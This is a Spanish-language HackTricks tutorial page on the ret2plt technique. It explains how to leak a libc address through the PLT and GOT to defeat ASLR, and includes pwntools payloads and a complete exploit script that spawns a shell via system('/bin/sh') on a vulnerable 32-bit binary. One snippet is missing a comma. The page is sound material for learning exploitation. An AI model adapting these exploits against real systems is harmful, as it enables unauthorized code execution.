# Ret2plt

{{#include ../../../../banners/hacktricks-training.md}}

## Información Básica

El objetivo de esta técnica sería **filtrar una dirección de una función del PLT** para poder eludir ASLR. Esto se debe a que, si, por ejemplo, filtras la dirección de la función `puts` de la libc, puedes entonces **calcular dónde está la base de `libc`** y calcular los desplazamientos para acceder a otras funciones como **`system`**.

Esto se puede hacer con una carga útil de `pwntools` como ([**desde aquí**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Nota cómo **`puts`** (usando la dirección del PLT) se llama con la dirección de `puts` ubicada en la GOT (Tabla de Desplazamiento Global). Esto se debe a que para cuando `puts` imprime la entrada de la GOT de `puts`, esta **entrada contendrá la dirección exacta de `puts` en memoria**.

También nota cómo se utiliza la dirección de `main` en el exploit, de modo que cuando `puts` termina su ejecución, el **binario llama a `main` nuevamente en lugar de salir** (así que la dirección filtrada seguirá siendo válida).

> [!CAUTION]
> Nota cómo para que esto funcione el **binario no puede ser compilado con PIE** o debes haber **encontrado una filtración para eludir PIE** para conocer la dirección del PLT, GOT y `main`. De lo contrario, necesitas eludir PIE primero.

Puedes encontrar un [**ejemplo completo de esta elusión aquí**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Este fue el exploit final de ese ejemplo:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## Otros ejemplos y referencias

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bits, ASLR habilitado pero sin PIE, el primer paso es llenar un desbordamiento hasta el byte 0x00 del canario para luego llamar a puts y filtrarlo. Con el canario se crea un gadget ROP para llamar a puts y filtrar la dirección de puts desde el GOT y luego un gadget ROP para llamar a `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR habilitado, sin canario, desbordamiento de pila en main desde una función hija. Gadget ROP para llamar a puts y filtrar la dirección de puts desde el GOT y luego llamar a un gadget one.

{{#include ../../../../banners/hacktricks-training.md}}
